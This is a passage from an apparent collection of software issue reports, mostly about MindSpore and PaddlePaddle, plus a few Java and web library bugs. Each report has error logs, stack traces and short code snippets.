learning_rate=0.003) ~/miniconda3/envs/Mindspore-0.5.0/lib/python3.7/site-packages/mindspore/_extends/utils.py in deco(self, *args, **kwargs) 82 del arguments['self'] 83 arguments = arguments.values() ---&gt; 84 fn(self, *args, **kwargs) 85 if attrs is not None: 86 if isinstance(attrs, list): ~/miniconda3/envs/Mindspore-0.5.0/lib/python3.7/site-packages/mindspore/nn/layer/basic.py in __init__(self, in_channels, out_channels, weight_init, bias_init, has_bias, activation) 197 has_bias=True, 198 activation=None): --&gt; 199 super(Dense, self).__init__() 200 self.in_channels = check_int_positive(in_channels) 201 self.out_channels = check_int_positive(out_channels) ~/miniconda3/envs/Mindspore-0.5.0/lib/python3.7/site-packages/mindspore/nn/cell.py in __init__(self, auto_prefix, flags) 69 self._parameter_layout_dict = {} 70 self._create_time = int(time.time() * 1e9) ---&gt; 71 init_backend() 72 # call gc to release GE session resources used by non-used cell objects 73 gc.collect() RuntimeError: mindspore/ccsrc/utils/context/ms_context.cc:216 OpenTsd] Device 4 is occupied, open tsd failed, status = 16986314."
"poi 5.0.0 ,ExcelUtil.readBySax 读取数据后两行读取不到","JDK版本： jdk11 hutool版本： 5.7.14 <ol start=""3""> 测试涉及到的文件 粗体   <code>: Map&lt;Integer, List&lt;Object&gt;&gt; mapList = new HashMap&lt;&gt;(); ExcelUtil.readBySax(inputStream, ""rId-1"", createRowHandler(mapList)); private RowHandler createRowHandler(Map&lt;Integer, List&lt;Object&gt;&gt; mapList) { RowHandler rowHandler = (sheetIndex, rowIndex, rowList) -&gt; { mapList.put(Convert.toInt(rowIndex), rowList); }; return rowHandler; }"
distribute training crashed on develop branch,"Run the demo code with 2<em>pservers + 2</em>trainers, other demos can also reproduce this bug:   <code>: test_word2vec.py I0514 07:31:17.266929 11136 operator.cc:546] expected_kernel_key:data_type[float32]:data_layout[ANY_LAYOUT]:place[CPUPlace]:library_type[PLAIN] PC: @ 0x0 (unknown) *** SIGSEGV (@0x0) received by PID 10770 (TID 0x7f8132309700) from PID 0; stack trace: *** @ 0x7f83817d6390 (unknown) @ 0x7f8334340dc7 std::_Hashtable&lt;&gt;::find() @ 0x7f833433eb69 paddle::framework::Scope::FindVarLocally() @ 0x7f833433eba4 paddle::framework::Scope::FindVar() @ 0x7f833432aa1f paddle::framework::ExecutionContext::Input&lt;&gt;() @ 0x7f8334230240 paddle::operators::SGDOpKernel&lt;&gt;::Compute() @ 0x7f833432dac6 paddle::framework::OperatorWithKernel::RunImpl() @ 0x7f833432a078 paddle::framework::OperatorBase::Run() @ 0x7f8333b83ace paddle::framework::Executor::RunPreparedContext()"
paddle安装错误 报numpy版本错误,"1）PaddlePaddle版本：paddlepaddle-gpu==2.2.1 2）python：3.7 3）系统环境：win10 conda环境 安装方式信息： 1）conda环境中 conda 安装 报错信息 ImportError: IMPORTANT: PLEASE READ THIS FOR ADVICE ON HOW TO SOLVE THIS ISSUE! Importing the numpy c-extensions failed. Try uninstalling and reinstalling numpy. If you have already done that, then: Check that you expected to use Python3.7 from ""D:\WorkSpace\Anaconda\envs\paddle_env_gpu\python.exe"", and that you have no directories in your PATH or PYTHONPATH that can interfere with the Python and numpy version ""1.18.1"" you're trying to use. If (1) looks fine, you can open a new issue at https://github.com/numpy/numpy/issues. Please include details on: how you installed Python how you installed numpy your operating system whether or not you have multiple versions of Python installed if you built from source, your compiler versions and ideally a build log If you're working with a numpy git repository, try (removes all files not under version control) and rebuild numpy. Note: this error has many possible causes, so please don't comment on an existing issue about this - open a new one instead. Original error was: DLL load failed: 找不到指定的模块。 测试 按报错信息是numpy和python版本不合，测试过numpy==1.18.1，也更新过新版numpy==2.21，都报相同错   <code>: git clean -xdf"
CPU only unit test fails on some operators.,"Binaries were built by failed tests: some error logs:   <code>: cmake -DWITH_COVERAGE=ON -DWITH_GPU=OFF -DWITH_MKL=OFF .. The following tests FAILED: 147 - test_conv2d_op (Failed) 148 - test_conv2d_transpose_op (Failed) 149 - test_conv3d_op (Failed) 150 - test_conv3d_transpose_op (Failed) 219 - test_norm_op (OTHER_FAULT) 227 - test_pool2d_op (Failed) 228 - test_pool3d_op (Failed) 233 - test_print_op (Failed) 286 - test_label_semantic_roles (Failed) ERROR: test_check_output (__main__.TestCUDNNCase6) ---------------------------------------------------------------------- Traceback (most recent call last): File ""test_pool3d_op.py"", line 99, in test_check_output self.check_output_with_place(place, atol=1e-5) File ""/Users/baidu/go/src/github.com/PaddlePaddle/Paddle/python/paddle/v2/fluid/tests/op_test.py"", line 276, in check_output_with_place feed_map = self.feed_var(inputs, place) File ""/Users/baidu/go/src/github.com/PaddlePaddle/Paddle/python/paddle/v2/fluid/tests/op_test.py"", line 245, in feed_var tensor.set(self.inputs[var_name], place) TypeError: set(): incompatible function arguments. The following argument types are supported: 1. (self: paddle.v2.fluid.core.Tensor, arg0: numpy.ndarray[float32], arg1: paddle::platform::CPUPlace) -&gt; None 2. (self: paddle.v2.fluid.core.Tensor, arg0: numpy.ndarray[int32], arg1: paddle::platform::CPUPlace) -&gt; None 3. (self: paddle.v2.fluid.core.Tensor, arg0: numpy.ndarray[float64], arg1: paddle::platform::CPUPlace) -&gt; None 4. (self: paddle.v2.fluid.core.Tensor, arg0: numpy.ndarray[int64], arg1: paddle::platform::CPUPlace) -&gt; None 5. (self: paddle.v2.fluid.core.Tensor, arg0: numpy.ndarray[bool], arg1: paddle::platform::CPUPlace) -&gt; None ... ERROR: test_backward (__main__.TestPrintOpGPU) ---------------------------------------------------------------------- Traceback (most recent call last): File ""test_print_op.py"", line 63, in setUp self.x_tensor.set(tensor_np, self.place) TypeError: set(): incompatible function arguments. The following argument types are supported: 1. (self: paddle.v2.fluid.core.Tensor, arg0: numpy.ndarray[float32], arg1: paddle::platform::CPUPlace) -&gt; None 2. (self: paddle.v2.fluid.core.Tensor, arg0: numpy.ndarray[int32], arg1: paddle::platform::CPUPlace) -&gt; None 3. (self: paddle.v2.fluid.core.Tensor, arg0: numpy.ndarray[float64], arg1: paddle::platform::CPUPlace) -&gt; None 4. (self: paddle.v2.fluid.core.Tensor, arg0: numpy.ndarray[int64], arg1: paddle::platform::CPUPlace) -&gt; None 5. (self: paddle.v2.fluid.core.Tensor, arg0: numpy.ndarray[bool], arg1: paddle::platform::CPUPlace) -&gt; None Invoked with: &lt;paddle.v2.fluid.core.LoDTensor object at 0x11fc257e0&gt;, array([[ 9.42935944e-01, 9.69691992e-01, 1.25991538e-01], [ 3.44808817e-01, 4.29206935e-04, 3.35851520e-01]], dtype=float32), &lt;paddle.v2.fluid.core.CUDAPlace object at 0x11fc259c0&gt;"
sparse_vector_sequence vs dense_vector_sequence,"When adding the in the function of , is it right that both the and input must be a matrix (i.e. list of lists of floats)? Is it right that for , I can have in my inner list, e.g.: But for , I cannot have in my inner list and I have to fill them up with zeros, i.e.: Is that the difference in the sparse and dense vector sequence in Paddle?   <code>: settings.slots hook() dataprovider.py dense_vector_sequence() sparse_vector_sequence sparse_vector_sequence() None [ [0.1, 0.2, 0.2], [0.4, None, None] ] dense_vector_sequence() None [ [0.1, 0.2, 0.2], [0.4, 0.0, 0.0] ]"
训练的时候加载的外部预训练的embedding也作为参数参加训练,"hi，RT。CNN-non-static: Same as above but the pretrained vectors are fine-tuned for each task. 加载embedding层的语句， 是这样处理？不确定是不是加对了？   <code>: emb = embedding_layer(input=data, size=emb_dim, param_attr=ParamAttr(name='_source_language_embedding'))` emb_para = ParameterAttribute(name='emb', initial_std=0., learning_rate=0.) fc1 = fc_layer(input=emb, size=hid_dim, act=linear, bias_attr=bias_attr, param_attr=emb_para)"
[ST][MS][modelzoo][deeplabv3][cpu] deeplabv3在cpu环境训练失败,"deeplabv3网络在cpu环境训练失败,ssd ssd_resnet50_fpn ssd_mobilenetv1_fpn 在gpu环境也有该报错 / 硬件环境: /device ascend : -- MindSpore version :commit_id = ''[sha1]:c1b80e30,[branch]:master -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_ms_deeplabv3_vocaug_cpu_train_check_loss_0001.py pytest -s test_ms_deeplabv3_vocaug_cpu_train_check_loss_0001.py 训练成功 转给张兆创   <code>: [ERROR] KERNEL(24367,7f9e7caac740,python):2022-10-27-19:28:11.470.062 [mindspore/ccsrc/plugin/device/cpu/kernel/resize_bilinear_cpu_kernel.cc:41] Init] For 'ResizeBilinear', the number of inputs must be2, but got 1 [CRITICAL] DEVICE(24367,7f9e7caac740,python):2022-10-27-19:28:11.470.464 [mindspore/ccsrc/plugin/device/cpu/hal/hardware/cpu_device_context.cc:338] CreateKernel] The Function Call Stack:In file /home/jenkins0/solution_test/cases/02network/00cv/deeplabv3/train/test_ms_deeplabv3_vocaug_cpu_train_check_loss_0001/src/nets/deeplab_v3/deeplab_v3.py:218/ out = P.ResizeBilinear((size[2], size[3]), True)(out)/ In file train.py:47/ output = self.network(input_data)/ In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/wrap/cell_wrapper.py:379/ loss = self.network(*inputs)/ load_model /home/workspace/mindspore_ckpt/deeplabv3/modelzoo_pretrain/resnet101_ascend_v120_imagenet2012_official_cv_bs32_acc78.ckpt success Traceback (most recent call last): File ""train.py"", line 209, in train() File ""/home/jenkins0/solution_test/cases/02network/00cv/deeplabv3/train/test_ms_deeplabv3_vocaug_cpu_train_check_loss_0001/model_utils/moxing_adapter.py"", line 105, in wrapped_func run_func(*args, **kwargs) File ""train.py"", line 205, in train model.train(args.train_epochs, dataset, callbacks=cbs, dataset_sink_mode=(args.device_target != ""CPU"")) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 1062, in train initial_epoch=initial_epoch) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 98, in wrapper func(self, *args, **kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 617, in _train self._train_process(epoch, train_dataset, list_callback, cb_params, initial_epoch, valid_infos) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 914, in _train_process outputs = self._train_network(*next_element) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 619, in __call__ out = self.compile_and_run(*args) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 1004, in compile_and_run self.compile(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 976, in compile jit_config_dict=self._jit_config_dict) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 1390, in compile result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode()) RuntimeError: ---------------------------------------------------- - The Function Call Stack: (For framework developers) ---------------------------------------------------- In file /home/jenkins0/solution_test/cases/02network/00cv/deeplabv3/train/test_ms_deeplabv3_vocaug_cpu_train_check_loss_0001/src/nets/deeplab_v3/deeplab_v3.py:218/ out = P.ResizeBilinear((size[2], size[3]), True)(out)/ In file train.py:47/ output = self.network(input_data)/ In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/wrap/cell_wrapper.py:379/ loss = self.network(*inputs)/ ---------------------------------------------------- - C++ Call Stack: (For framework developers) ---------------------------------------------------- mindspore/ccsrc/plugin/device/cpu/hal/hardware/cpu_device_context.cc:338 CreateKernel"
oracle templateOne查询结果不正确,"maven 表结构 实体类 业务代码 日志 替换日志输出在工具中执行,是有结果的   <code>: &lt;dependency&gt; &lt;groupId&gt;com.ibeetl&lt;/groupId&gt; &lt;artifactId&gt;beetl-framework-starter&lt;/artifactId&gt; &lt;version&gt;1.1.56.RELEASE&lt;/version&gt; &lt;/dependency&gt; create table T_FILE ( ID VARCHAR2(64) not null primary key, ADD_TIME DATE, SERVER_PATH VARCHAR2(1000) default 1000, SIZEE NUMBER, HUMAN_SIZE VARCHAR2(50), MD5 VARCHAR2(64) ) @Data @Table(name = ""t_file"") public class RadFile { @AssignID(""uuid"") private String id; private String md5; private String savePath; // 文件路径-&gt;/{存储服务指定路径}/{当前时间}/{md5}.{文件后缀} private Long sizee; private String humanSize; private TaskState state; public RadFile(String md5) { this.md5 = md5; } } RadFile radFile=new RadFile(md5); radFile=radFileDao.templateOne(radFile); System.out.println(radFile); ┏━━━━━ Debug [radFile._gen_selectByTemplate_page] ━━━ ┣ SQL： SELECT * FROM ( SELECT beeltT.*, ROWNUM beetl_rn FROM ( select * from DPCENTER.T_FILE where 1=1 and MD5=? ) beeltT WHERE ROWNUM &lt;?) WHERE beetl_rn &gt;= ? ┣ 参数： [""0001"", 2, 1] ┣ 位置： com.rad.file.server.radfil.api.service.impl.AttachmentService.addAttachment(AttachmentService.java:25) ┣ 时间： 11ms ┣ 结果： [0] ┗━━━━━ Debug [radFile._gen_selectByTemplate_page] ━━━ SELECT * FROM (SELECT beeltT.*, ROWNUM beetl_rn FROM (select * from DPCENTER.T_FILE where 1 = 1 and MD5 = '0001') beeltT WHERE ROWNUM &lt; 2) WHERE beetl_rn &gt;= 1;"
Fix save load inference model and remove pickle ,"Fix #7221:fluid.io don't show in the website This pr addresses comments by @Xreki on #7636:Migrate private registry server. It fixes the following issues: Remove unused LoadInferenceModel() function Use a better way to detect if a variable is a feed var. Allow user to pass different feed/fetch var names other than the default and Remove dependency on pickle when saving / loading inference model Because of the change in save/load_inference_model function, the executor.run() method in executor.py is also modified to also handle the situation where the loaded inference model has already been prepended/appended feed/fetch operator (it will throw error when the info contained in the already attached feed/fetch ops do not match the and input arguments) TODO: In the future PR, we will also create a new executor.run() function in the C++ executor class to mimic how executor.py handle ProgramDesc in this PR.   <code>: feed fetch feed fetch_list"
【GDB dwarf】Enum作为复合类型的成员时不支持,"基本的enum类型已经支持好了 但是enum作为复合类型的成员时，比如指针、struct等的成员时，目前还没有映射到ALIAS上 gdb：   <code>: #include &lt;limits.h&gt; #include &lt;stdio.h&gt; extern void abort (void); extern void exit (int); enum e { a = INT_MIN }; struct foo { enum e ii; }; int *p; enum e *q; int main (void) { enum e x = a; q = &amp;x; struct foo f; f.ii =a; if (*(1 ? q : p) &gt; 0) abort (); exit (0); } Reading symbols from enum-3.out...done. (gdb) b enum-3.c:22 Breakpoint 1 at 0x400664: file /home/z00518955/master/maple/OpenArkCompiler/testsuite/c_test/gtorture_test/GCC00834-g.torture.execute-enum-3/enum-3.c, line 22. (gdb) r Starting program: /home/zhangjing/work/testsuite/c_test/gtorture_test/GCC00834-g.torture.execute-enum-3/enum-3.out Missing separate debuginfos, use: dnf debuginfo-install glibc-2.28-9.h39.eulerosv2r8.aarch64 Breakpoint 1, main () at /home/z00518955/master/maple/OpenArkCompiler/testsuite/c_test/gtorture_test/GCC00834-g.torture.execute-enum-3/enum-3.c:22 22 if (*(1 ? q : p) &gt; 0) (gdb) ptype x type = enum e {a = -2147483648} (gdb) p x $1 = a (gdb) ptype q type = int * &lt;-----gcc:enum e * (gdb) ptype f.ii type = int &lt;-----gcc:enum e (gdb) p f.ii $2 = -2147483648"
activiti多数据源配置，在线等待老哥们帮助，多谢多谢,"类：配置文件如下，（图片上传不了=。=） @configuration public class ActivitiConfig extends AbstractProcessEngineAutoConfiguration { } ， yml配置如下： spring: redis: host: localhost port: 6379 password: datasource: master: url: jdbc:postgresql: driver-class-name: org.postgresql.Driver username: password: activiti: jdbc-url: driver-class-name: org.postgresql.Driver username: password:   <code>: @Bean @ConfigurationProperties(prefix = ""spring.datasource.master"") public DataSource masterDataSource() { return DataSourceBuilder.create().build(); } @Bean @Primary @ConfigurationProperties(prefix = ""spring.datasource.activiti"") public DataSource activitiDataSource() { return DataSourceBuilder.create().build(); } @Bean public SpringProcessEngineConfiguration springProcessEngineConfiguration( PlatformTransactionManager transactionManager, SpringAsyncExecutor springAsyncExecutor) throws IOException { return baseSpringProcessEngineConfiguration( activitiDataSource(), transactionManager, springAsyncExecutor); }"
[CT][MS]算子nllloss  target越界情况 不报错,"ops层 nllloss 算子 参数target 要求是范围是0-input的第二个维度-1 标杆有做校验 mindspore未做校验 / 硬件环境: /device GPU/CPU : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph 执行用例 报错 passed   <code>: def test_p_nllloss_input_defualt(): x = np.random.randn(300, 10).astype(np.float32) target = np.random.randint(10, 15, (300)).astype(np.int32) weight = np.random.randn(10).astype(np.float32) reduction = ""mean"" fact = NLLLossFactory(x, target, weight, reduction) fact.forward_cmp() fact.grad_cmp()"
通过docker安装时出现错误,"Discovered Package: orangehill/iseed Package manifest generated successfully. 89 packages you are using are looking for funding. Use the command to find out more! Illuminate\Database\QueryException SQLSTATE[HY000] [2002] Connection refused (SQL: select * from information_schema.tables where table_schema = wookteam and table_name = wook_migrations and table_type = 'BASE TABLE') at vendor/laravel/framework/src/Illuminate/Database/Connection.php:712 708▕ // If an exception occurs when attempting to run a query, we'll format the error 709▕ // message to include the bindings with SQL, which will make this exception a 710▕ // lot more helpful to the developer instead of just the database's errors. 711▕ catch (Exception $e) { ? 712▕ throw new QueryException( 713▕ $query, $this-&gt;prepareBindings($bindings), $e 714▕ ); 715▕ } 716▕ } 37 artisan:37 Illuminate\Foundation\Console\Kernel::handle() Stopping wooktask-nginx-07b7f9 ... done Stopping wooktask-php-07b7f9 ... done Stopping wooktask-mariadb-07b7f9 ... done Stopping wooktask-redis-07b7f9 ... done Starting redis ... done Starting mariadb ... done Starting php ... done Starting nginx ... done   <code>: composer fund +36 vendor frames"
There is bug in l2_normalize.,There is a lack of square root operation () after .   <code>: sqrt reduce_sum
 [重构] 事件总线全部功能代码,当前版本的事件总线采用 保存事件对象，然后通过 创建代理委托调用。该方式有以下问题： 1、运行时内存占用且无法释放内存 2、性能较低 3、不支持依赖注入解析服务，只能通过 解析服务 4、消息承载数据不支持泛型 5、不支持事件类别 6、不支持方法直接解析服务 7、不支持集成消息队列库，如rbmq，kafka 8、不支持事件总线存储介质（可实现自定义面板） 所以新版本采用 重构，解决以上所有问题。同时支持以下功能 异常策略支持 支持动态调用事件方法   <code>: ConcurrentDictionary Delegate.CreateDelegate Scoped.Create [FromService] Channel
加载训练了2个epoch的SSD-MobileNetV2预训练模型训练报错,"1、参考https://www.hiascend.com/zh/software/modelzoo/detail/C/fb334bf9d3e5e6f67a626a53bffe78b0 进行训练，成功训练并保存了2个epoch的模型。 2、使用以下命令加载预训练模型进行训练，报错 bash scripts/run_1p_train.sh 0 2 0.05 coco /home/ma-user/work/xu/SSD-MobileNetV2_for_MindSpore_1.1_code/ssd-2_154.ckpt 2 完整log.txt日志 https://issue-modelzoo.obs.cn-north-4.myhuaweicloud.com/xuyetao/ssd_ms/log.txt   <code>: [ERROR] DEVICE(117515,fff894ff91e0,python):2022-04-24-20:35:00.858.537 [mindspore/ccsrc/runtime/device/ascend/ascend_kernel_runtime.cc:684] DumpTaskExceptionInfo] Task fail infos task_id: 12, stream_id: 4, tid: 120142, device_id: 0, retcode: 507011 ( model execute failed)"
请问表格加入表单元素之后值变更的问题,"比如加入checkbox（是|否）、Select之后，变更值时，怎么知道是哪一行的数据？如何修改表格对应的数据对象的值？ 对应监听：   <code>: &lt;script type=""text/html"" id=""isAnswer""&gt; &lt;input type=""checkbox"" name=""isAnswerTable"" value=""{{d.isNeedInput}}"" lay-skin=""switch"" lay-text=""是|否"" lay-filter=""isAnswerTable"" {{ d.isAnswer== 'true' ? 'checked' : '' }}&gt; &lt;/script&gt; &lt;script type=""text/html"" id=""isNeedInput""&gt; &lt;input type=""checkbox"" name=""isNeedInputTable"" value=""{{d.isNeedInput}}"" lay-skin=""switch"" lay-text=""是|否"" lay-filter=""isNeedInputTable"" {{ d.isNeedInput== 'true' ? 'checked' : '' }}&gt; &lt;/script&gt; form.on('switch(isAnswerTable)', function (obj) { layer.tips(this.value + ' ' + this.name + '：' + obj.elem.checked, obj.othis); }); form.on('checkbox(isNeedInputTable)', function (obj) { layer.tips(this.value + ' ' + this.name + '：' + obj.elem.checked, obj.othis); });"
【算子众智】【武汉理工大学】【计算-GPU】【SparseFillEmptyRows】算子开发Wiki的性能测试框架有误,"`mindspore-assistant` 在算子性能测试时，框架打印的MS时间和实际不符。 和性能测试输出的时间（单位：微秒）不相符。   <code>: // CPU time struct timeval tp; gettimeofday(&amp;tp, NULL); double iStart = ((double)tp.tv_sec + (double)tp.tv_usec * 1.e-6); SparseFillEmptyRows(input_indice_addr, input_values_addr, input_default_values_addr, input_dense_shape_addr, 0, input_indices_shapes_[0], dense_row, workspace_elements_per_rows_addr, workspace_empty_rows_count_addr, workspace_row_indices_addr, workspace_input_row_ends_addr, workspace_sorted_indices_addr, workspace_final_shape_addr, workspace_origin_index_addr, workspace_sorted_key_addr, reinterpret_cast&lt;cudaStream_t&gt;(cuda_stream_), output_indices_addr, output_values_addr, output_empty_row_indicator_addr, output_reverse_index_map_addr); CHECK_CUDA_RET_WITH_EXCEPT_NOTRACE( cudaMemcpyAsync(&amp;real_output_size_, workspace_final_shape_addr, sizeof(int64_t), cudaMemcpyDeviceToHost, reinterpret_cast&lt;cudaStream_t&gt;(cuda_stream_)), ""SparseFillEmptyRows cudaMemcpyAsync failed.""); cudaDeviceSynchronize(); // 同步函数 gettimeofday(&amp;tp, NULL); double iElaps = ((double)tp.tv_sec + (double)tp.tv_usec * 1.e-6) - iStart; //单位是second std::cout &lt;&lt; ""CPU TIME 237-246:"" &lt;&lt; iElaps * 1.e3 &lt;&lt; std::endl; // CPU time end return true; cudaEvent_t start, stop; float elapsedTime = 0.0; cudaEventCreate(&amp;start); cudaEventCreate(&amp;stop); cudaEventRecord(start, 0); CopyRowIndiceKernel&lt;&lt;&lt;CUDA_BLOCKS(device_id, indice_num), GET_THREADS, 0, cuda_stream&gt;&gt;&gt;(indices_ptr, row_indices, origin_index, indice_num); cudaEventRecord(stop, 0); cudaMemset(elements_per_rows, 0, dense_row * sizeof(int64_t)); CalElementPerRowsKernel&lt;&lt;&lt;CUDA_BLOCKS(device_id, indice_num), GET_THREADS, 0, cuda_stream&gt;&gt;&gt;( dense_shape_ptr, row_indices, elements_per_rows, indice_num); CalEmptyRowIndicatorKernel&lt;&lt;&lt;CUDA_BLOCKS(device_id, dense_row), GET_THREADS, 0, cuda_stream&gt;&gt;&gt;( elements_per_rows, dense_row, output_empty_row_indicator_ptr); InclusivePrefixSum(dense_row, elements_per_rows, input_row_ends, cuda_stream); InclusiveBoolPrefixSum(dense_row, output_empty_row_indicator_ptr, empty_row_count_sum, cuda_stream); RowsSort(indice_num, cuda_stream, dense_shape_ptr, row_indices, origin_index, sorted_key, sorted_indices, device_id); AssignValueKernel&lt;&lt;&lt;CUDA_BLOCKS(device_id, dense_row), GET_THREADS, 0, cuda_stream&gt;&gt;&gt;( values_ptr, indices_ptr, sorted_indices, dense_row, default_value, empty_row_count_sum, input_row_ends, output_values_ptr, output_indices_ptr, indice_num, final_shape, output_reverse_index_map_ptr); cudaEventRecord(stop, 0); cudaEventSynchronize(stop); cudaEventElapsedTime(&amp;elapsedTime, start, stop); std::cout &lt;&lt; ""AssignValueKernel"" &lt;&lt; elapsedTime &lt;&lt; std::endl; cudaEventDestroy(start); cudaEventDestroy(stop); std::cout &lt;&lt; std::endl; # get random data. def gen_data_file(shape, dtype, rand_type, low, high): if rand_type == ""randint"": rand_data = np.random.randint(low, high, size=shape) else: rand_data = np.random.uniform(low, high, size=shape) data = np.array(rand_data, dtype=dtype) return data # generate dense_shape, limit_cnt def get_rand_dense(): dense_x = random.randint(1, 1000) dense_y = random.randint(1, 1000) limit = dense_x*dense_y return dense_x, dense_y, limit # 生成规定cnt数目， 在limit_x，limit_y范围内的indices 并且不重复。 def rand_index(cnt, limit_x, limit_y): res = set() for i in range(cnt): while True: x = random.randint(0, limit_x - 1) y = random.randint(0, limit_y - 1) if (x, y) in res: continue res.add((x, y)) break return Tensor(list(res)) ''' dense 2000W, values number=10W ''' def test_sfer_2000x10000_performance(): indices = rand_index(100000, 10000, 2000) values =Tensor(np.array(np.random.randn(100000)),dtype=ms.float32) default_value = Tensor(np.random.randn(),dtype = ms.float32) dense = Tensor([10000, 2000], dtype=ms.int64) fact = SparseFillEmptyRowsMock(inputs=[indices, values, dense, default_value]) fact.forward_profile_cmp()"
fix some enforce,Add and replaced all replace some enforces with richer enforces.   <code>: PADDLE_ENFORCE_NOT_NULL != nullptr
FileUtil的bug,您好： FileUtil的loopFiles，如果FileFilter传空的话会取不到file的。 都会被这个条件屏蔽掉   <code>: if (fileFilter != null &amp;&amp; fileFilter.accept(file)) { fileList.add(file); }
在全局异常引入的时候，button异步click出现异常，无法恢复正常,"同时引入全局异常ErrorLogger，点击报错后，button还是点击等待状态，不能恢复正常状态。 错误代码的异常信息。 组件版本 latest 浏览器 all Server Side [] Web Assembly   <code>: &lt;Button OnClick=""LoginClick"" Color=""Color.Primary"" Text=""登录"" IsAsync=""true"" /&gt; private async Task LoginClick(MouseEventArgs e) { var a = 0; _ = 1 / a; await Task.Delay(5000); }"
Excel导入设置LastOfInvalidRow当表格无数据时候，系统异常,"org.jeecgframework.poi.exception.excel.ExcelImportException: Excel 值获取失败 at org.jeecgframework.poi.excel.imports.ExcelImportServer.importExcel(ExcelImportServer.java:229) at org.jeecgframework.poi.excel.imports.ExcelImportServer.importExcelByIs(ExcelImportServer.java:393) at org.jeecgframework.poi.excel.ExcelImportUtil.importExcel(ExcelImportUtil.java:83) 如果数据为0条，最后一行无效数据会进入循环，导致取值失败。需要在 row = rows.next(); 后添加 判断。 Excel格式   <code>: while (rows.hasNext() &amp;&amp; (row == null || sheet.getLastRowNum() - row.getRowNum() &gt; params.getLastOfInvalidRow())) { if (params.getReadRows() &gt; 0 &amp;&amp; readRow &gt; params.getReadRows()) { break; } row = rows.next(); // 判断是集合元素还是不是集合元素,如果是就继续加入这个集合,不是就创建新的对象 // keyIndex 如果为空就不处理,仍然处理这一行 if (params.getKeyIndex() != null if(sheet.getLastRowNum() - row.getRowNum() &lt; params.getLastOfInvalidRow() ){ break; }"
mpirun noticed that process rank 140 with PID 363 on node 10.87.102.19 exited on signal 9 (Killed).,"报错信息如下，这是因为什么? 谢谢 id: app-user-20180906172439-7725   <code>: Thu Sep 6 17:32:25 2018[1,115]&lt;stderr&gt;:+ GLOG_log_dir=./log Thu Sep 6 17:32:25 2018[1,115]&lt;stderr&gt;:+ ./paddle_pserver2 --num_gradient_servers=150 --nics=xgbe0 --port=03538 --ports_num=1 --ports_num_for_sparse=1 --rdma_tcp=tcp --comment=paddle_cluster_job Thu Sep 6 17:32:25 2018[1,81]&lt;stderr&gt;:+ GLOG_log_dir=./log Thu Sep 6 17:32:25 2018[1,81]&lt;stderr&gt;:+ ./paddle_pserver2 --num_gradient_servers=150 --nics=xgbe0 --port=03538 --ports_num=1 --ports_num_for_sparse=1 --rdma_tcp=tcp --comment=paddle_cluster_job Thu Sep 6 17:32:25 2018[1,95]&lt;stderr&gt;:+ export LD_LIBRARY_PATH=/usr/local/lib:./python27-gcc482/lib::/usr/local/openmpi/lib:/home/normandy/nma/tools/hadoop-client/hadoop/lib:/home/normandy/nma/tools/hadoop-client/hadoop/libhce/lib:/home/normandy/nma/tools/hadoop-client/hadoop/libhdfs:/home/normandy/nma/tools/hadoop-client/hadoop/../java6/jre/lib/amd64/server Thu Sep 6 17:32:25 2018[1,95]&lt;stderr&gt;:+ LD_LIBRARY_PATH=/usr/local/lib:./python27-gcc482/lib::/usr/local/openmpi/lib:/home/normandy/nma/tools/hadoop-client/hadoop/lib:/home/normandy/nma/tools/hadoop-client/hadoop/libhce/lib:/home/normandy/nma/tools/hadoop-client/hadoop/libhdfs:/home/normandy/nma/tools/hadoop-client/hadoop/../java6/jre/lib/amd64/server Thu Sep 6 17:32:25 2018[1,16]&lt;stderr&gt;:+ export LD_LIBRARY_PATH=/usr/local/lib:./python27-gcc482/lib::/usr/local/openmpi/lib:/home/normandy/nma/tools/hadoop-client/hadoop/lib:/home/normandy/nma/tools/hadoop-client/hadoop/libhce/lib:/home/normandy/nma/tools/hadoop-client/hadoop/libhdfs:/home/normandy/nma/tools/hadoop-client/hadoop/../java6/jre/lib/amd64/server Thu Sep 6 17:32:25 2018[1,55]&lt;stderr&gt;:+ GLOG_log_dir=./log Thu Sep 6 17:32:25 2018[1,55]&lt;stderr&gt;:+ ./paddle_pserver2 --num_gradient_servers=150 --nics=xgbe0 --port=03538 --ports_num=1 --ports_num_for_sparse=1 --rdma_tcp=tcp --comment=paddle_cluster_job Thu Sep 6 17:32:25 2018[1,91]&lt;stderr&gt;:+ LD_LIBRARY_PATH=/usr/local/lib:./python27-gcc482/lib::/usr/local/openmpi/lib:/home/normandy/nma/tools/hadoop-client/hadoop/lib:/home/normandy/nma/tools/hadoop-client/hadoop/libhce/lib:/home/normandy/nma/tools/hadoop-client/hadoop/libhdfs:/home/normandy/nma/tools/hadoop-client/hadoop/../java6/jre/lib/amd64/server Thu Sep 6 17:32:25 2018[1,61]&lt;stderr&gt;:+ GLOG_log_dir=./log Thu Sep 6 17:32:25 2018[1,61]&lt;stderr&gt;:+ ./paddle_pserver2 --num_gradient_servers=150 --nics=xgbe0 --port=03538 --ports_num=1 --ports_num_for_sparse=1 --rdma_tcp=tcp --comment=paddle_cluster_job Thu Sep 6 17:32:25 2018[1,147]&lt;stderr&gt;:+ source ./server.env Thu Sep 6 17:32:25 2018[1,125]&lt;stderr&gt;:+ GLOG_log_dir=./log Thu Sep 6 17:32:25 2018[1,125]&lt;stderr&gt;:+ ./paddle_pserver2 --num_gradient_servers=150 --nics=xgbe0 --port=03538 --ports_num=1 --ports_num_for_sparse=1 --rdma_tcp=tcp --comment=paddle_cluster_job Thu Sep 6 17:32:25 2018[1,95]&lt;stderr&gt;:+ 